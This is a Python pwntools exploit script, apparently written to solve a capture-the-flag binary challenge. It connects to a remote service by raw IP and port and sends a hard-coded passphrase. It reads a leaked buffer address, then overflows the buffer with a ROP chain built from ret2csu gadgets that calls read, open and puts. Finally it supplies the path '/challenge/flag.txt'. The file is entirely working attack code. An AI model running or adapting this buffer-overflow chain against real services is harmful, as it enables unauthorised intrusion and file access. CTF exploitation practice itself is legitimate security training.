#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519
csu_pop = 0x401512
csu_call = 0x4014f8

got_read = 0x403250
bss_path = 0x404100  # BSS area for path string

# Stage: read(0, bss_path, 32) → open(bss_path, 0) → puts("Spooktober") → main
pad = b'A' * 64 + b'B' * 8
rop = p64(csu_pop)
rop += p64(0) + p64(1) + p64(0) + p64(bss_path) + p64(32) + p64(got_read)
rop += p64(csu_call)   # read(0, bss_path, 32)
rop += p64(0) + p64(0)*6
rop += p64(pop_rdi)
rop += p64(bss_path)
rop += p64(pop_rsi_r15)
rop += p64(0) + p64(0)
rop += p64(0x4010e0)   # open(bss_path, 0)
rop += p64(pop_rdi)
rop += p64(0x402041)   # "Spooktober!!!"
rop += p64(0x401040)   # puts@plt
rop += p64(0x401393)   # main

payload = pad + rop
print(f'Payload: {len(payload)}B')
r.send(payload)

import time
time.sleep(0.3)
r.send(b'/challenge/flag.txt\x00')

try:
    data = r.recv(timeout=5)
    print(f'Data ({len(data)}B): {data[:500]}')
    if data.count(b'Spooktober') >= 2:
        print('open via BSS path works!')
except Exception as e:
    print(f'Error: {e}')
r.close()
